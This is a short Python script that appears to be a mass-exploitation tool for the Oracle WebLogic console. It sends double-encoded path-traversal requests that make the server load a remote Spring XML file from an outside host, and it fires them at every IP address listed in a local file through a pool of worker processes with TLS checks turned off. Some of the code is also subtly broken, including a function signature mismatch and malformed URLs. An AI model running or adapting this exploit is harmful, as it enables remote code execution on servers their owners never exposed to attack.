# coding:utf-8
import http.client
import multiprocessing

import requests

http.client.HTTPConnection._http_vsn = 10
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'

requests.packages.urllib3.disable_warnings()


def exp():
    url_cmd1 = 'https://' + ip + """console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("https://xxx/e.xml")"""
    url_cmd2 = 'https://' + ip + """/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http:https://xxx/z.xml")"""
    headers_cmd = {
        'User-Agent': 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    res1 = requests.get(url_cmd1, headers=headers_cmd, timeout=15, verify=False)
    res2 = requests.get(url_cmd2, headers=headers_cmd, timeout=15, verify=False)


if __name__ == "__main__":
    pool = multiprocessing.Pool(processes=8)
    f = open("C:/Users/Administrator/Desktop/JOKERNET/POC/ip.txt",'r')
    sourceInLines = f.readlines()
    f.close()
    new = []
    for line in sourceInLines:
        ip = line.strip('\n')
        pool.apply_async(exp, (ip,))
    pool.close()
    pool.join()
    print("What i have done.")
